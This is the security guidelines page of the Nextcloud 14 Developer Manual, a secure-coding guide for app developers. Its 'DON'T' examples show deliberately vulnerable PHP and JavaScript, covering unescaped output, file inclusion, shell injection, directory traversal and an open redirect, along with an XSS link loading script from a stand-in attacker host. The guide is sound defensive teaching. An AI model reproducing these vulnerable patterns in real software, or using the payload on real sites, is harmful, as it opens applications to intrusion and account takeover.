[ ![Logo](https://docs.nextcloud.com/server/14/developer_manual/_static/logo-white.png) ](https://docs.nextcloud.com/server/14/developer_manual/index.html)
  * [](https://docs.nextcloud.com/server/14/developer_manual/general/index.html)
    * [Community code of conduct](https://docs.nextcloud.com/server/14/developer_manual/general/code-of-conduct.html)
    * [Development environment](https://docs.nextcloud.com/server/14/developer_manual/general/devenv.html)
    * [](https://docs.nextcloud.com/server/14/developer_manual/general/security.html)
      * [SQL injection](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#sql-injection)
      * [](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#cross-site-scripting)
        * [Templates](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#templates)
        * [JavaScript](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#javascript)
      * [Clickjacking](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#clickjacking)
      * [Code executions / file inclusions](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#code-executions-file-inclusions)
      * [Directory traversal](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#directory-traversal)
      * [Shell injection](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#shell-injection)
      * [Auth bypass / privilege escalations](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#auth-bypass-privilege-escalations)
      * [Sensitive data exposure](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#sensitive-data-exposure)
      * [Cross site request forgery](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#cross-site-request-forgery)
      * [Unvalidated redirects](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#unvalidated-redirects)
      * [Getting help](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#getting-help)
    * [Coding style & general guidelines](https://docs.nextcloud.com/server/14/developer_manual/general/codingguidelines.html)
    * [Performance considerations](https://docs.nextcloud.com/server/14/developer_manual/general/performance.html)
    * [Debugging](https://docs.nextcloud.com/server/14/developer_manual/general/debugging.html)
    * [Backporting](https://docs.nextcloud.com/server/14/developer_manual/general/backporting.html)
  * [Changelog](https://docs.nextcloud.com/server/14/developer_manual/app/changelog.html)
  * [Tutorial](https://docs.nextcloud.com/server/14/developer_manual/app/tutorial.html)
  * [Create an app](https://docs.nextcloud.com/server/14/developer_manual/app/startapp.html)
  * [Navigation and pre-app configuration](https://docs.nextcloud.com/server/14/developer_manual/app/init.html)
  * [App metadata](https://docs.nextcloud.com/server/14/developer_manual/app/info.html)
  * [Classloader](https://docs.nextcloud.com/server/14/developer_manual/app/classloader.html)
  * [Request lifecycle](https://docs.nextcloud.com/server/14/developer_manual/app/request.html)
  * [Routing](https://docs.nextcloud.com/server/14/developer_manual/app/routes.html)
  * [Middleware](https://docs.nextcloud.com/server/14/developer_manual/app/middleware.html)
  * [Container](https://docs.nextcloud.com/server/14/developer_manual/app/container.html)
  * [Controllers](https://docs.nextcloud.com/server/14/developer_manual/app/controllers.html)
  * [RESTful API](https://docs.nextcloud.com/server/14/developer_manual/app/api.html)
  * [Templates](https://docs.nextcloud.com/server/14/developer_manual/app/templates.html)
  * [JavaScript](https://docs.nextcloud.com/server/14/developer_manual/app/js.html)
  * [CSS](https://docs.nextcloud.com/server/14/developer_manual/app/css.html)
  * [Translation](https://docs.nextcloud.com/server/14/developer_manual/app/l10n.html)
  * [Theming support](https://docs.nextcloud.com/server/14/developer_manual/app/theming.html)
  * [Database schema](https://docs.nextcloud.com/server/14/developer_manual/app/schema.html)
  * [Database access](https://docs.nextcloud.com/server/14/developer_manual/app/database.html)
  * [Configuration](https://docs.nextcloud.com/server/14/developer_manual/app/configuration.html)
  * [Filesystem](https://docs.nextcloud.com/server/14/developer_manual/app/filesystem.html)
  * [AppData](https://docs.nextcloud.com/server/14/developer_manual/app/appdata.html)
  * [User management](https://docs.nextcloud.com/server/14/developer_manual/app/users.html)
  * [Two-factor providers](https://docs.nextcloud.com/server/14/developer_manual/app/two-factor-provider.html)
  * [Hooks](https://docs.nextcloud.com/server/14/developer_manual/app/hooks.html)
  * [Background jobs (Cron)](https://docs.nextcloud.com/server/14/developer_manual/app/backgroundjobs.html)
  * [Settings](https://docs.nextcloud.com/server/14/developer_manual/app/settings.html)
  * [Logging](https://docs.nextcloud.com/server/14/developer_manual/app/logging.html)
  * [Migrations](https://docs.nextcloud.com/server/14/developer_manual/app/migrations.html)
  * [Repair steps](https://docs.nextcloud.com/server/14/developer_manual/app/repair.html)
  * [Testing](https://docs.nextcloud.com/server/14/developer_manual/app/testing.html)
  * [App store publishing](https://docs.nextcloud.com/server/14/developer_manual/app/publishing.html)
  * [Code signing](https://docs.nextcloud.com/server/14/developer_manual/app/code_signing.html)
  * [App development](https://docs.nextcloud.com/server/14/developer_manual/app/index.html)
  * [Design guidelines](https://docs.nextcloud.com/server/14/developer_manual/design/index.html)
  * [Android application development](https://docs.nextcloud.com/server/14/developer_manual/android_library/index.html)
  * [Client APIs](https://docs.nextcloud.com/server/14/developer_manual/client_apis/index.html)
  * [Core development](https://docs.nextcloud.com/server/14/developer_manual/core/index.html)
  * [Bugtracker](https://docs.nextcloud.com/server/14/developer_manual/bugtracker/index.html)
  * [Help and communication](https://docs.nextcloud.com/server/14/developer_manual/commun/index.html)
  * [API Documentation](https://docs.nextcloud.com/server/14/developer_manual/api.html)


[Nextcloud 14 Developer Manual](https://docs.nextcloud.com/server/14/developer_manual/index.html)
  * [](https://docs.nextcloud.com/server/14/developer_manual/index.html) »
  * [General contributor guidelines](https://docs.nextcloud.com/server/14/developer_manual/general/index.html) »
  * Security guidelines
  * [ Edit on GitHub](https://github.com/nextcloud/documentation/edit/stable14/developer_manual/general/security.rst)


* * *
# Security guidelines[¶](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#security-guidelines "Permalink to this headline")
This guideline highlights some of the most common security problems and how to prevent them. Please review your app if it contains any of the following security holes.
Note
**Program defensively** : for instance always check for CSRF or escape strings, even if you do not need it. This prevents future problems where you might miss a change that leads to a security hole.
Note
All App Framework security features depend on the call of the controller through `OCA\AppFramework\App::main`. If the controller method is executed directly, no security checks are being performed!
## SQL injection[¶](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#sql-injection "Permalink to this headline")
[SQL Injection](http://en.wikipedia.org/wiki/SQL_injection) occurs when SQL query strings are concatenated with variables.
To prevent this, always use prepared queries:
```
<?php
$sql = 'SELECT * FROM `users` WHERE `id` = ?';
$query = \OCP\DB::prepare($sql);
$params = array(1);
$result = $query->execute($params);

```

If the App Framework is used, write SQL queries like this in a class that extends the Mapper:
```
<?php
// inside a child mapper class
$sql = 'SELECT * FROM `users` WHERE `id` = ?';
$params = array(1);
$result = $this->execute($sql, $params);

```

## Cross site scripting[¶](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#cross-site-scripting "Permalink to this headline")
[Cross site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting) happens when user input is passed directly to templates. A potential attacker might be able to inject HTML/JavaScript into the page to steal the users session, log keyboard entries, even perform DDOS attacks on other websites or other malicious actions.
Despite the fact that Nextcloud uses Content-Security-Policy to prevent the execution of inline JavaScript code developers are still required to prevent XSS. CSP is just another layer of defense that is not implemented in all web browsers.
To prevent XSS in your app you have to sanitize the templates and all JavaScripts which performs a DOM manipulation.
### Templates[¶](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#templates "Permalink to this headline")
Let’s assume you use the following example in your application:
```
<?php
echo $_GET['username'];

```

An attacker might now easily send the user a link to:
```
app.php?username=<script src="attacker.tld"></script>

```

to overtake the user account. The same problem occurs when outputting content from the database or any other location that is writable by users.
Another attack vector that is often overlooked is XSS in **href** attributes. HTML allows to execute JavaScript in href attributes like this:
```
<a href="javascript:alert('xss')">

```

To prevent XSS in your app, **never use echo, print() or <%=** - use **p()** instead which will sanitize the input. Also **validate URLs to start with the expected protocol** (starts with http for instance)!
Note
Should you ever require to print something unescaped, double check if it is really needed. If there is no other way (e.g. when including of subtemplates) use print_unescaped with care.
### JavaScript[¶](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#javascript "Permalink to this headline")
Avoid manipulating the HTML directly via JavaScript, this often leads to XSS since people often forget to sanitize variables:
```
var html = '<li>' + username + '</li>"';

```

If you **really** want to use JavaScript for something like this use escapeHTML to sanitize the variables:
```
var html = '<li>' + escapeHTML(username) + '</li>';

```

An even better way to make your app safer is to use the jQuery built-in function **$.text()** instead of **$.html()**.
**DON’T**
```
messageTd.html(username);

```

**DO**
```
messageTd.text(username);

```

It may also be wise to choose a proper JavaScript framework like AngularJS which automatically handles the JavaScript escaping for you.
## Clickjacking[¶](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#clickjacking "Permalink to this headline")
[Clickjacking](http://en.wikipedia.org/wiki/Clickjacking) tricks the user to click into an invisible iframe to perform an arbitrary action (e.g. delete an user account)
To prevent such attacks Nextcloud sends the X-Frame-Options header to all template responses. Don’t remove this header if you don’t really need it!
This is already built into Nextcloud in [`OC_Template`](https://docs.nextcloud.com/server/14/developer_manual/api/OC_Template.html#OC_Template "OC_Template").
## Code executions / file inclusions[¶](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#code-executions-file-inclusions "Permalink to this headline")
Code Execution means that an attacker is able to include an arbitrary PHP file. This PHP file runs with all the privileges granted to the normal application and can do an enormous amount of damage.
Code executions and file inclusions can be easily prevented by **never** allowing user-input to run through the following functions:
  * **include()**
  * **require()**
  * **require_once()**
  * **eval()**
  * **fopen()**


Note
Also **never** allow the user to upload files into a folder which is reachable from the URL!
**DON’T**
```
<?php
require("/includes/" . $_GET['file']);

```

Note
If you have to pass user input to a potentially dangerous function, double check to be sure that there is no other way. If it is not possible otherwise sanitize every user parameter and ask people to audit your sanitize function.
## Directory traversal[¶](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#directory-traversal "Permalink to this headline")
Very often developers forget about sanitizing the file path (removing all \ and /), this allows an attacker to traverse through directories on the server which opens several potential attack vectors including privilege escalations, code executions or file disclosures.
**DON’T**
```
<?php
$username = OC_User::getUser();
fopen("/data/" . $username . "/" . $_GET['file'] . ".txt");

```

**DO**
```
<?php
$username = OC_User::getUser();
$file = str_replace(array('/', '\\'), '',  $_GET['file']);
fopen("/data/" . $username . "/" . $file . ".txt");

```

Note
PHP also interprets the backslash (\\) in paths, don’t forget to replace it too!
## Shell injection[¶](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#shell-injection "Permalink to this headline")
[Shell Injection](http://en.wikipedia.org/wiki/Code_injection#Shell_injection) occurs if PHP code executes shell commands (e.g. running a latex compiler). Before doing this, check if there is a PHP library that already provides the needed functionality. If you really need to execute a command be aware that you have to escape every user parameter passed to one of these functions:
  * **exec()**
  * **shell_exec()**
  * **passthru()**
  * **proc_open()**
  * **system()**
  * **popen()**


Note
Please require/request additional programmers to audit your escape function.
Without escaping the user input this will allow an attacker to execute arbitrary shell commands on your server.
PHP offers the following functions to escape user input:
  * **escapeshellarg()** : Escape a string to be used as a shell argument
  * **escapeshellcmd()** : Escape shell metacharacters


**DON’T**
```
<?php
system('ls '.$_GET['dir']);

```

**DO**
```
<?php
system('ls '.escapeshellarg($_GET['dir']));

```

## Auth bypass / privilege escalations[¶](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#auth-bypass-privilege-escalations "Permalink to this headline")
Auth bypass/privilege escalations happen when a user is able to perform unauthorized actions.
Nextcloud offers three simple checks:
  * **OCP\JSON::checkLoggedIn()** : Checks if the logged in user is logged in
  * **OCP\JSON::checkAdminUser()** : Checks if the logged in user has admin privileges
  * **OCP\JSON::checkSubAdminUser()** : Checks if the logged in user has group admin privileges


Using the App Framework, these checks are already automatically performed for each request and have to be explicitly turned off by using annotations above your controller method, see [Controllers](https://docs.nextcloud.com/server/14/developer_manual/app/controllers.html).
Additionally always check if the user has the right to perform that action. (e.g. a user should not be able to delete other users’ bookmarks).
## Sensitive data exposure[¶](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#sensitive-data-exposure "Permalink to this headline")
Always store user data or configuration files in safe locations, e.g. **nextcloud/data/** and not in the webroot where they can be accessed by anyone using a web browser.
## Cross site request forgery[¶](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#cross-site-request-forgery "Permalink to this headline")
Using [CSRF](http://en.wikipedia.org/wiki/Cross-site_request_forgery) one can trick a user into executing a request that he did not want to make. Thus every POST and GET request needs to be protected against it. The only places where no CSRF checks are needed are in the main template, which is rendering the application, or in externally callable interfaces.
Note
Submitting a form is also a POST/GET request!
To prevent CSRF in an app, be sure to call the following method at the top of all your files:
```
<?php
OCP\JSON::callCheck();

```

If you are using the App Framework, every controller method is automatically checked for CSRF unless you explicitly exclude it by setting the @NoCSRFRequired annotation before the controller method, see [Controllers](https://docs.nextcloud.com/server/14/developer_manual/app/controllers.html)
## Unvalidated redirects[¶](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#unvalidated-redirects "Permalink to this headline")
This is more of an annoyance than a critical security vulnerability since it may be used for social engineering or phishing.
Always validate the URL before redirecting if the requested URL is on the same domain or an allowed resource.
**DON’T**
```
<?php
header('Location:'. $_GET['redirectURL']);

```

**DO**
```
<?php
header('Location: https://example.com'. $_GET['redirectURL']);

```

## Getting help[¶](https://docs.nextcloud.com/server/14/developer_manual/general/security.html#getting-help "Permalink to this headline")
If you need help to ensure that a function is secure please ask on our [forum](https://help.nextcloud.com) or on our IRC channel **#nextcloud-dev** on **irc.freenode.net**.
[Next ](https://docs.nextcloud.com/server/14/developer_manual/general/codingguidelines.html "Coding style & general guidelines") [](https://docs.nextcloud.com/server/14/developer_manual/general/devenv.html "Development environment")
* * *
© Copyright 2021 Nextcloud GmbH.
Read the Docs v: 14

Versions
    [14](https://docs.nextcloud.com/server/14/developer_manual)     [15](https://docs.nextcloud.com/server/15/developer_manual)     [16](https://docs.nextcloud.com/server/16/developer_manual)     [stable](https://docs.nextcloud.com/server/stable/developer_manual)     [latest](https://docs.nextcloud.com/server/latest/developer_manual)

Downloads


On Read the Docs
     [Project Home](https://docs.nextcloud.com/projects//?fromdocs=)      [Builds](https://docs.nextcloud.com/builds//?fromdocs=)
